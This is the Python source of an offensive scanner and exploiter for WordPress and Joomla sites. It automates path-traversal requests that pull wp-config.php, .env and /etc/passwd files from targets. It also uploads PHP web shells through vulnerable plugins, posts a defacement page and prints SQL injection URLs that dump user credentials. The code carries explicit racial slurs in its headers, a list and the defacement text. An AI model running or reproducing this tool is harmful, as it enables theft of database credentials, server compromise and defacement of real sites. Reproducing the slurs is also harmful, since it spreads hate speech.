import os, requests, colorama, socket, getpass, subprocess, json, time, re, datetime, random, threading, io, multiprocessing
import urllib3
from multiprocessing import Pool, freeze_support
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import Fore
from colorama import init

init()

YELLOW = Fore.YELLOW
GREEN  = Fore.GREEN
RED = Fore.RED
LIGHTRED = Fore.LIGHTRED_EX
PURPLE = Fore.MAGENTA
RESET = Fore.RESET
CYAN = Fore.CYAN
now = datetime.datetime.now()
year = now.strftime('%Y')
month = now.strftime('%m')

HEADERS = {
    'User-Agent': 'NiggerPenis-WIN!10',
    'Content-type' : '*/*',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
}

def banner():
    os.system("cls;clear")
    print(f"""
            {YELLOW}______________________________\n
                   {YELLOW} [ {RED}~ {CYAN}Vulnnr {RED}~ {YELLOW}]  \n
               {YELLOW} [ {RED}~ {CYAN}Creator Nano {RED}~ {YELLOW}]   \n    
                   {YELLOW} [ {RED}~ {CYAN}V 1.0 {RED}~ {YELLOW}]      
            ______________________________
                 {RESET}Try the help command {RED}!{RESET}
                                                                  
    
    
    """)
    
banner()
dirs = [
    '/wp-content/wpclone-temp/wpclone_backup/',
    '/wp-config2.txt',
    '/wp-config.txt',
    '/wp-backup.txt',
    '/WORDPRESS.txt',
    '/wordpress.txt',
    '/Wordpress.txt',
    '/__MACOSX/',
    '/phpinfo.php',
    '/wordpress/wp-admin/',
    '/wp-content/wpbackitup_backups',
    '/backup',
    'wp-login.php',
]

DowloadConfig = [
 '/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php',
 '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
 '/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php',
 '/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php',
 '/wp-admin/admin-ajax.php?action=cpabc_appointments_calendar_update&cpabc_calendar_update=1&id=../../../../../../wp-config.php',
 '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes',
 '/wp-admin/admin.php?page=multi_metabox_listing&action=edit&id=../../../../../../wp-config.php',
 '/wp-content/force-download.php?file=../wp-config.php',
 '/force-download.php?file=wp-config.php',
 '/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php',
 '/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&file=../../../../wp-config.php',
 '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php',
 '/wp-content/plugins/mini-mail-dashboard-widgetwp-mini-mail.php?abspath=../../wp-config.php',
 '/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=../../../../wp-config.php',
 '/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php',
 '/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../wp-config.php',
 '/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php',
 '/wp-content/plugins/tera-charts/charts/treemap.php?fn=../../../../wp-config.php',
 '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
 '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php',
 '/cs/wp-content/themes/mTheme-Unus/css.php?files=../../../../wp-config.php',
 '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php?path=../../../../../wp-config.php',
 '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php',
 '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php',
 '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
 '/wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php',
 '/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download',
 '/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd',
 '/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
 '/wp/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
 '/wordpress/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
 '/.env']

def config(url, path):
    Exp = url + str(path)
    GetConfig = requests.get(Exp, headers=HEADERS)
    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
    if GetConfig.status_code == 200:
        if "DB_NAME" in GetConfig.text:

            with io.open(filename, "a+", encoding="utf-8") as f:
                #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
                f.write(f"\nDB RESULTS:\n{GetConfig.text}\n")
            f.close()
            print(f"{RED}~{RESET} wp-configs ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
        elif "DB_HOST" in GetConfig.text:

            with io.open(filename, "a+", encoding="utf-8") as f:
                #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
                f.write(f"\nEnv RESULTS:\n{GetConfig.text}\n\n\n")
            f.close()
            print(f"{RED}~{RESET} Env config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")



def dirsscan(url, path):
    Exp = url + str(path)
    GetConfig = requests.get(Exp, headers=HEADERS)
    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
    if GetConfig.status_code == 200:
        with io.open(filename, "a+", encoding="utf-8") as f:
            #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
            f.write(f"\n\n\nDIRSCAN: {GetConfig.url}\n\n\n")
        f.close()
        print(f"{RED}~ {RESET}Found {GREEN}{GetConfig.url}")
        
    




    


def Exploit(url):
    global flag
    thread = []
    flag = False
    for path in DowloadConfig:
        if not flag == False:
            return 
        t = threading.Thread(target=config, args=(url, path))
        t.start()
        thread.append(t)
        

    for j in thread:
        j.join()

    if flag == False:
        return 


def dirs2(url):
    global flag
    thread = []
    flag = False
    for path in dirs:
        if not flag == False:
            return 
        t = threading.Thread(target=dirsscan, args=(url, path))
        t.start()
        thread.append(t)
        

    for j in thread:
        j.join()

    if flag == False:
        return 

### thumbnailSlider Exploit is broken bc i am shit coder, if u want to try and fix the error remove the try statement at the auto def
def wp_thumbnailSlider(url):
        with open('shell/hatelife.gif', 'rb') as img:
            name_img = os.path.basename('shell/hatelife.gif')
            files = {
                'image': (name_img, img, 'multipart/form-data', {'Expires': '0'})}
            upload_file = requests.post(url, files=files,headers=HEADERS,verify=False)
            fname = re.findall(re.compile(r'/slider\/(.*\.gif)/'), upload_file)
            if fname:
                dump_data = url + "wp-content/uploads/wp-responsive-images-thumbnail-slider/"+fname
                print(f"{RED}~ {RESET}thumbnailslider Upload = {GREEN}Vuln")
                return dict(
                    url=url,
                    name="Thumbnail Slider",
                    status=True,
                    shell=dump_data
                )
            else:
                print(f"{RED}~ {RESET}thumbnailslider Upload = {RED}Not Vuln")
                return dict(
                    url=url,
                    name="Thumbnail Slider",
                    status=False
                )

def Spreedsheet(url):
    test = requests.get(url+"/wp-content/plugins/wpSS/ss_load.php")
    if test.status_code == 200:
        print(f"{RED}~ {RESET}Found SQL Injection | {GREEN}{url}?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain")
    else:  
        print(f"{RED}~ {RESET}wpSS SQL = {RED}Not Vuln")

def revexploit(url):
        exploit = requests.get(url + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
        if exploit.status_code == 200:
            with open(filename, "a+") as f:
                f.write(exploit.text)
            f.close()
            print(f"{RED}~ {RESET}Revslider exploit = Database config has been saved to {GREEN}%s" % filename)
        else: # else any other HTTP reponse means site is not vulnerable!
             print(f"{RED}~ {RESET}RevSlider exploit = {RED}Not Vuln")

def eshop(url):
        exploit = requests.get(url + "/wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php")
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
        if exploit.status_code == 200:
            with open(filename, "a+") as f:
                f.write(exploit.text)
            f.close()
            print(f"{RED}~ {RESET}eshop exploit = Database config has been saved to {GREEN}%s" % filename)
        else: # else any other HTTP reponse means site is not vulnerable!
             print(f"{RED}~ {RESET}eshop exploit = {RED}Not Vuln")



def com_media(url):
        list = ['i', 'hate', 'niggers']
        endpoint = url+"/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder="
        HEADERS = {"content-type": "form-data"}
        fieldname = 'Filedata[]'
        shell = open('shell/candyman.txt','rb')
        data = {
                fieldname:shell,
        }
        requests.post(endpoint, data=data, headers=HEADERS,verify=False).text
        dump_data = endpoint+"/images/candyman.txt"
        response = requests.get(dump_data,HEADERS,verify=False).text
        lol = requests.get(url+"/images/candyman.txt")
        if re.findall(r'Tig', response):
            return dict(
                url=url,
                name="com_media",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="com_media",
                status=False
            )
 
def wp_jobmanager(url):
        regex = re.compile(r'image\/gif')
        endpoint = url + "/jm-ajax/upload_file/"
        image = open('shell/hatelife.gif', 'rb')
        field = "file[]"
        HEADERS['content-type'] = 'multipart/form-data'
        options = {
            field: image
        }
        HEADERS['Content_Type'] = 'multipart/form-data'
        requests.post(endpoint, data=options,headers=HEADERS,verify=False).text
        dump_data = url + "/wp-content/uploads/job-manager-uploads/file/" + \
            year+"/"+month+"/hatelife.gif"
        response = requests.get(dump_data,headers=HEADERS,verify=False)
        res = response.headers['content-type']
        check_jobmanager = re.findall(regex, res)
        if check_jobmanager:

            print(f"{RED}~ {RESET}Jobmanager Upload = {GREEN}Vuln")
            filename = "Results/shells.txt"
            with open(filename, "a+") as f:
                f.write(dump_data.url)
            f.close()

            return dict(
                url=url,
                name="Job Manager    ",
                status=True,
                shell=dump_data
            )
        else:
            print(f"{RED}~ {RESET}Jobmanager Upload = {RED}Not Vuln")
            return dict(
                url=url,
                name="Job Manager     ",
                status=False
            )

def tutor(url):
    test = requests.get(url+"/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd")
    if test.status_code == 200:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(f"EXPLOIT: {test.url}\n\n")
            f.write(test.text)
        f.close()
        print(f"{RED}~{RESET} tutor LFI = {GREEN}Vuln saved to {GREEN}" + filename)
    else:
        print(f"{RED}~{RESET} tutor LFI = {RED}Not Vuln")



def Localize(url):
    test = requests.get(url+"/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd")
    if test.status_code == 200:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(f"EXPLOIT: {test.url}\n\n")
            f.write(test.text)
        f.close()
        print(f"{RED}~{RESET} Localize LFI = {GREEN}Vuln saved to {GREEN}" + filename)
    else:
        print(f"{RED}~{RESET} Localize LFI = {RED}Not Vuln")




def photog(url):
    test = requests.get(url+"/wp-content/plugins/photo-gallery")
    if test.status_code == 200:
        print(f"{RED}~ {RESET}Found SQL Injection | {GREEN}{url}/wp-admin/admin-ajax.php?action=albumsgalleries_bwg&album_id=<SQLi+HERE>&width=785&height=550&bwg_nonce=9e367490cc")
    else:  
        print(f"{RED}~ {RESET}photo-gallery SQL = {RED}Not Vuln")

def autosuggest(url):
    '''
    Exploit https://www.exploit-db.com/exploits/45977
    '''
    test = requests.get(url+"/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&")
    if test.status_code == 403:
        print(f"{RED}~ {RESET}Found SQL Injection | {GREEN}{test.url}?wpas_action=query&wpas_keys=1")
    else:
        
        print(f"{RED}~ {RESET}autosuggest SQL = {RED}Not Vuln")


def admintakeover(url):
    email = "n1337testing@protonmail.com"
    GET = requests.get(url+"/wp-admin/admin-ajax.php")
    AjaxTokEN = re.findall('"ajaxSecurity":"(.*)"', str(GET.content))[0]
    payload = {'action': 'wpgdprc_process_action','security': str(AjaxTokEN)}
    payload['data'] = json.dumps({'type': 'save_setting',
        'append': False,
        'option': 'new_admin_email',
        'value': email
        })
    GG = requests.post(url+"/wp-admin/admin-ajax.php", headers=HEADERS, data=payload)
    if '{"message":"","error":""}' in str(GG.content):
        print(f"{RED} ~{RESET}admin_email_reset = {GREEN}Vuln{RESET} sent email to {CYAN}{email}")
        pass
    else:
        print(f"{RED} ~{RESET}admin_email_reset = {RED}Not Vuln")
        pass


def wp_cherry(url):
        HEADERS['Content_Type'] = 'multipart/form-data'
        options = {
            'file': open('shell/hateme.php', 'rb')
        }
        endpoint = url + "/wp-content/plugins/cherry-plugin/admin/import-export/upload.php"
        requests.post(endpoint, data=options,headers=HEADERS,verify=False)
        dump_data = url + "/wp-content/plugins/cherry-plugin/admin/import-export/hateme.php?cmd=ls"
        content = requests.get(dump_data,headers=HEADERS,verify=False).text
        check_cherry = re.findall("hateme", content)
        if check_cherry:
            print(f"{RED}~ {RESET}Cherry Upload = {GREEN}Vuln")
            filename = "Results/shells.txt"
            with open(filename, "a+") as f:
                f.write(dump_data.url)
            f.close()
            return dict(
                url=url,
                name="CherryFramework ",
                status=True,
                shell=dump_data
            )
        else:
            print(f"{RED}~ {RESET}Cherry Upload = {RED}Not Vuln")
            return dict(
                url=url,
                name="CherryFramework ",
                status=False
            )

def wp_blaze(url):
        HEADERS['Content_Type'] = 'multipart/form-data'
        regex = re.compile(r'\/uploads\/blaze\/(.*?)\/big\/hateme.php')
        options = {
            'album_img': [open('shell/hateme.php', 'rb')],
            'task': 'blaze_add_new_album',
            'album_name': '',
            'album_desc': ''
        }
        endpoint = url + "/wp-admin/admin.php?page=blaze_manage"
        content = requests.post(endpoint, data=options, headers=HEADERS,verify=False).text
        check_blaze = re.findall(regex, content)
        if check_blaze:
            uploadfolder = check_blaze.group(1)
            dump_data = url + "/wp-content/uploads/blaze/"+uploadfolder+"/big/hateme.php?cmd=X"
            print(f"{RED}~ {RESET}Blaze_manager = {GREEN}Vuln")
            filename = "Results/shells.txt"
            with open(filename, "a+") as f:
                f.write(dump_data.url)
            f.close()
            return dict(
                url=url,
                name="Blaze SlideShow ",
                status=True,
                shell=dump_data
            )
        else:
            print(f"{RED}~ {RESET}Blaze_manager = {RED}Not Vuln")
            
            return dict(
                url=url,
                name="Blaze SlideShow ",
                status=False
            )


def audioplayer(url):
    test = requests.get(url+"/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/etc/passwd")
    if test.status_code == 200:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(f"EXPLOIT: {test.url}\n\n")
            f.write(test.text)
        f.close()
        print(f"{RED}~{RESET} audioplayer LFI = {GREEN}Vuln saved to {GREEN}" + filename)
    else:
        print(f"{RED}~{RESET} audioplayer LFI = {RED}Not Vuln")

def searchserver():
    '''
    Broken /;
    '''
    url = input("FD ")
    response = requests.get(url, headers=HEADERS).headers
    regx = re.compile(r"(.+) \((.+)\)")
    data = regx.search(response["server"])
    print(f"OS : {data}")


def wp_plugin(url):
    plugins_array = []
    getplugin = requests.get(url, headers=HEADERS).text
    matches = re.findall(re.compile(r'wp-content/plugins/(\w+)?/'), getplugin)
    if len(matches) > 0:
        for plugin in matches:
            if plugin not in plugins_array:
                plugins_array.append(plugin)
        for i in range(len(plugins_array)):
            print(f"{RED}~ "+'%sPlugins : %s%s ' % (RESET, GREEN, plugins_array[i]))

def wp_user(url):
    url + '/?author=1'
    getuser = requests.get(url, headers=HEADERS).text
    matches = re.search(re.compile(r'author/(\w+)?/'), getuser)
    if matches:
        user = matches.group(1)
        return print(f"{RED}~ {RESET}"+'%sUser :%s %s' % (RESET, GREEN, user))
    else:
        print(f"{RED}~ {RESET}Users: {RED}No Users{RESET}")
def wp_version(url):
    getversion = requests.get(url, headers=HEADERS).text
    # searching version content from the http response. \d{:digit} version form 0.0.0
    matches = re.search(re.compile(
        r'content=\"WordPress (\d{0,9}.\d{0,9}.\d{0,9})?\"'), getversion)
    if matches:
        version = matches.group(1)
        return print(f"{RED}~ "+'%sWordpress Version :%s %s' % (RESET, GREEN, version) + f"{RESET}")
    else:
        print(f"{RED}~ {RESET}Version: {RED}No Version{RESET}")


def wp_dirs(url):
    
   
    dir1 = requests.get(url+"/wp-content/plugins/")
    url1 = dir1.url
    if "//" in dir1.url:
        url1 = dir1.url.replace("//", '/')
        pass
    if dir1.status_code == 200:
        print(f"{RED}~ {RESET}Found {GREEN}{url1}")
        pass
    dir2 = requests.get(url+"/wp-admin/install")
    url2 = dir2.url
    if "//" in dir2.url:
        url2 = dir2.url.replace("//", '/')
        pass
    if dir2.status_code == 200:
        print(f"{RED}~ {RESET}Found {GREEN}{url2}")
        
    dir3 = requests.get(url+"/wp-register.php", headers=HEADERS)
   

    url3 = dir3.url
    if "//" in dir3.url:
        url3 = dir3.url.replace("//", '/')
        pass
    
    if "?registration=disabled" in dir3.url:
        pass
    else:
        if dir3.status_code == 200:
            print(f"{RED}~ {RESET}Found {GREEN}{url3} {RESET}| {YELLOW}register.php might be enabled ")
        
        
    dir5 = requests.get(url+"/wp-content/themes/")
    url5 = dir5.url
    if "//" in dir5.url:
        url5 = dir5.url.replace("//", '/')
        pass
    if dir5.status_code == 200:
        print(f"{RED}~ {RESET}Found {GREEN}{url5}")

    dir6 = requests.get(url+"/wp-content/uploads/wp-backup-plus/")
    url6 = dir6.url
    if "//" in dir6.url:
        url6 = dir6.url.replace("//", '/')
        pass
    if dir6.status_code == 200:
        print(f"{RED}~ {RESET}Found {GREEN}{url6} {RESET}| {YELLOW} Take alook!")
    
    dir7 = requests.get(url+"/wp-content/uploads/wp-backup-plus-backups/")
    url7 = dir7.url
    if "//" in dir7.url:
        url7 = dir7.url.replace("//", '/')
        pass
    if dir7.status_code == 200:
        print(f"{RED}~ {RESET}Found {GREEN}{url7} {RESET}| {YELLOW} Take alook!")
        


def boldgrid(url):
    test = requests.get(url+"/wp-content/plugins/boldgrid-backup/cli/env-info.php")
    if test.status_code == 200:
        uwu = json.loads(test.text)
        print(f"{RED}~ {RESET}boldgrid config ={GREEN} Vuln {RESET}saved results to {GREEN}" + filename)
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(f"\nhttp_host: {uwu['http_host']}\n server_addr: {uwu['']}\n username: {uwu['username']}\nphp_uname: {uwu['php_uname']}")
        f.close()
    else:
        print(f"{RED}~ {RESET}boldgrid config = {RED} Not Vuln")

def spritz(url):
    test = requests.get(url+"wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd")
    if test.status_code == 200:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(f"EXPLOIT: {test.url}\n\n")
            f.write(test.text)
        f.close()
        print(f"{RED}~ {RESET}spritz LFI ={GREEN} Vuln {RESET}saved results to {GREEN}" + filename)
    else:
        print(f"{RED}~ {RESET}spritz LFI = {RED} Not Vuln")

def soswaf(url):
    payload = "ls -la;whomai"
    test = requests.get(url+"wp-admin/admin-post.php?swp_debug=load_options&swp_url={payload}")
    if test.status_code == 500:
        print(f"{RED}~ {RESET}Social Warfare = {GREEN}Vuln")
        pass
    else:
        print(f"{RED}~ {RESET}Social Warfare = {RED}Not Vuln")
        

def lol(url):
    payload = "/etc/passwd"
    test = requests.get(url+"wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path={payload}")
    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
    if test.status_code == 200:
        with open(filename, "a+") as f:
            f.write(test.text)
        f.close()
        print(f"{RED}~ {RESET}Site Editor = {GREEN}Vuln {RESET}results saved to {GREEN}"+filename)
    else:
        print(f"{RED}~ {RESET}Site Editor = {RED}Not Vuln")

def wp_themes(url):
    themes_array = []
    getthemes = requests.get(url, headers=HEADERS).text
    matches = re.findall(re.compile(r'themes/(\w+)?/'), getthemes)
    # loop for matching themes.)
    if len(matches) > 0:
        for theme in matches:
            if theme not in themes_array:
                themes_array.append(theme)
        for i in range(len(themes_array)):
            print(f"{RED}~ {RESET}"+'%sThemes :%s %s ' % (RESET, GREEN, themes_array[i]))
    else:
        print(f"{RED}~ {RESET}Themes: {RED}No Themes")

def revslidercss(url):
    IndeXText = 'I Swear I Hate Niggers - VulnX'
    ency = {'action': 'revslider_ajax_action','client_action': 'update_captions_css',
       'data': "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'>" + IndeXText + "<p style='color: transparent'>"
    }
    test = requests.post(url+"/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css", data=ency, timeout=10, headers=HEADERS)
    if 'succesfully' in str(test.content):
        print(f"{RED}~ {RESET}revslidercss = {GREEN} Vuln Deface here{RESET} {test.url}")
    else:
        print(f"{RED}~ {RESET}revslidercss = {RED} Not Vuln")


def mailman():
    user = input(f"Site{RED}:{RESET} ")
    try:
        cpanelcheck = requests.get(f"{user}/cpanel")
        init_time = time.time()
        if cpanelcheck.status_code == 200:
            pass
        else:
            print(f"{RED}Does not Have a Cpanel Redirect")
            return main()
    except:
        return main()
    try:
        now = requests.get(f"{user}/mailman/listinfo/mailman")

        output = subprocess.getoutput("curl "+user+"/mailman/listinfo/mailman -s | findstr POST").split('"')[1]

        print(f"Backend{RED}: {RESET}{output.replace('/mailman/listinfo/mailman', '')}")
        end_time = time.time()
        elapsed_time = end_time - init_time
        print('%s[%s Elapsed Time %s]%s => %.2f seconds ' % (YELLOW,RESET,YELLOW,RESET,elapsed_time))

        dn = output.replace('/mailman/listinfo/mailman', '').replace("https:/", '')

        dns = requests.get(f"http://ip-api.com/json/{dn}").text
        print("\nWould u like to get info on the backend?")
        usernext = input(f"Y/N{RED}: {RESET}")
        if usernext == "Y":
            pass
     
        if usernext == "N":
            return main()
        
        print(f"Backend Info{RED}: {RESET}\n" + dns.replace(",", '\n').replace('"', '',).replace('{', '').replace('}', '').replace(':', ': '))

    #print(dns)
    except Exception as e:
        
        return main()


    return main()

def serialize(url):
        result = dict(
            name=detect(url)   
        )
        return result

def detect(url):
        """
        this module to detect cms & return type of cms.
        & make instance of cms.

        I STOLE THIS FROM https://github.com/anouarbensaad/vulnx/blob/91fb3700f4fa5c00dcbfb4ab25685ce988040e36/modules/detector.py#L53 BC IDK HOW I WOULD DO IT

        """
        if re.search(re.compile(r'<script type=\"text/javascript\" src=\"/media/system/js/mootools.js\"></script>|/media/system/js/|com_content|Joomla!'), __getcontent__(url)):
            name = 'Joomla'
            return name
        
        elif re.search(re.compile(r'wp-content|wordpress|xmlrpc.php'), __getcontent__(url)):
            name = 'Wordpress'
            return name
        elif re.search(re.compile(r'Drupal|drupal|sites/all|drupal.org'), __getcontent__(url)):
            name = 'Drupal'
            return name

        elif re.search(re.compile(r'Prestashop|prestashop'), __getcontent__(url)):
            name = 'Prestashop'
            return name
        elif re.search(re.compile(r'route=product|OpenCart|route=common|catalog/view/theme'), __getcontent__(url)):
            name = 'Opencart'
            return name

        elif re.search(re.compile(r'Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento'), __getcontent__(url)):
            name = 'Magento'
            return name
        
        else:
            name = 'Unknown'
            return name


def __getcontent__(url):
        return requests.get(url, headers=HEADERS,verify=False).text



def auto(url):
    
    if url == "":
        normalerrors()
        return main()
    if "http" in url:
        pass
    else:
        print(f"{YELLOW}[ {RED}~ {RESET} need to add https{RED}/{RESET}http {RESET}before the url {RED}~{RESET} {YELLOW}]{RESET}")
        return main()

    try:
        print(f"\n{YELLOW}[ {RED}~ {RESET} Looking for CMS {RED}~{RESET} {YELLOW}]{RESET}")
        
        cms = serialize(url)
        print(f"{RED}~ {RESET}CMS:{RESET}{GREEN} ", cms['name'])
        if "Wordpress" in cms['name']:

            print(f"\n{YELLOW}[ {RED}~ {RESET} Starting wpscan! {RED}~{RESET} {YELLOW}]{RESET}")
            
            wp_version(url)
            wp_user(url)
            wp_themes(url)
            wp_plugin(url)
            print(f"\n{YELLOW}[ {RED}~ {RESET} Starting Dirscan! {RED}~{RESET} {YELLOW}]{RESET}")
            dirs2(url)
            wp_dirs(url)
            print("")
            Exploit(url)
            print(f"\n{YELLOW}[ {RED}~ {RESET} Starting vulnscan! {RED}~{RESET} {YELLOW}]{RESET}")
            revslidercss(url)
            Spreedsheet(url)
            wp_blaze(url)
            spritz(url)
            photog(url)
            eshop(url)
            Localize(url)
            tutor(url)
            boldgrid(url)
            autosuggest(url)
            lol(url)
            wp_cherry(url)
            soswaf(url)
            #admintakeover(url) Broken ) ;
            wp_jobmanager(url)
            #filename = url.replace("http://", '').replace('/', '')+".txt"
            revexploit(url)
            audioplayer(url)
        else:
            print(f"\n{YELLOW}[ {RED}~ {RESET} Could not detect CMS {RED}~{RESET} {YELLOW}]{RESET}\n")
            print(f"{YELLOW}[ {RED}~ {RESET} Starting Dirscan! {RED}~{RESET} {YELLOW}]{RESET}")
            Exploit(url)
            return main()
    except Exception as e:
        #print(e)
        pass
    try:
        wp_thumbnailSlider(url)
    except:
        pass

    


def normalerrors():
    print(f"{RESET}i guess something went {RED}wrong{RESET}, try again? {RESET}")
    return main()
    
def portcheck():
    user = input(f"Site{RED}:{RESET} ")

    target = user

    if "http" in target:
        print("Maybe instead of calling protocalls try www.google.com")
        return main()
    if target == "":
        print("Looks like value is null, enter a site!")
        return portcheck()

    portu = input(f"Port{RED}:{RESET} ")
    try:
        
        if portu == "":
            print("Port has to be int value")
            pass
        port = int(portu)

    except:
        normalerrors()


    portsobject = {
    21: 'FTP',
    22: 'SSH',
    23: 'Telnet',
    25: 'SMTP',
    43: 'Whois',
    53: 'DNS',
    68: 'DHCP',
    80: 'HTTP',
    110: 'POP3',
    115: 'SFTP',
    119: 'NNTP',
    123: 'NTP',
    139: 'NetBIOS',
    143: 'IMAP',
    161: 'SNMP',
    220: 'IMAP3',
    389: 'LDAP',
    443: 'SSL',
    1521: 'Oracle SQL',
    2049: 'NFS',
    3306: 'mySQL',
    5800: 'VNC',
    8080: 'HTTP',
    }
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    if port:
        try:

            result = sock.connect((target, port))
        except:
            return main()

        if result == 0:
            
            return main()
        else:
            print('{} Port is Open => {} '
                    .format(port, portsobject[port]))
            
            return main()




def xhelp():
    print("")
    print(f"             {YELLOW} [ {RED}~ {CYAN}Vulnnr {RED}~ {YELLOW}]")
    print(f"     {YELLOW}______________________________\n")
    print(f"       {RED}~ {RESET}webvulns")
    print(f"       {RED}~ {RESET}exploits\n")


    print(f"     {YELLOW}______________________________\n")
    return main()
def main():
    

    host_name = socket.gethostname()
    user = getpass.getuser()
    ## Just cool theme shit

    try:
        dirpath = os.getcwd()
        foldername = os.path.basename(dirpath)
        userinput = input(f"{RESET}{user}{YELLOW}@{CYAN}{host_name}:{RED}~{CYAN}/{foldername}{RED}$ {RESET}")
        #tmp = sp.call('clear', shell=True)
    except (KeyboardInterrupt, SystemExit):
        print(f"\n{c}Leaving {Y}Madsploit... {w}")

        sys.exit()
        raise
    if userinput == "port":
        portcheck()
    if userinput == "xhelp":
        xhelp()
    elif userinput == "help":
        xhelp()
    elif userinput == "mailman":
        mailman()
    elif userinput == "wpversion":
        url = input(f"Site{RED}: {RESET}")
        wp_version(url)
        return main()
    elif userinput == "wpthemes":
        url = input(f"Site{RED}: {RESET}")
        wp_themes(url)
        return main()
    elif userinput == "wpscan":
        print(f"\n{YELLOW}[ {RED}~ {RESET}Wordpress Scanner/exploiter  {RED}~ {YELLOW}] {RESET}\n")
        url = input(f"Target{RED}: {RESET}")
        init_time = time.time()
        
        auto(url)
        end_time = time.time()
        elapsed_time = end_time - init_time
        print('%s[%s Elapsed Time %s]%s => %.2f seconds \n' % (YELLOW,RESET,YELLOW,RESET,elapsed_time))
        return main()

    if userinput == "cls":
        os.system("cls;clear")
        
        return main()

    try:
        os.system(f"{userinput}")
    except (KeyboardInterrupt, SystemExit):
        print("EXIT")  
    except:
        return main()
    return main()
main()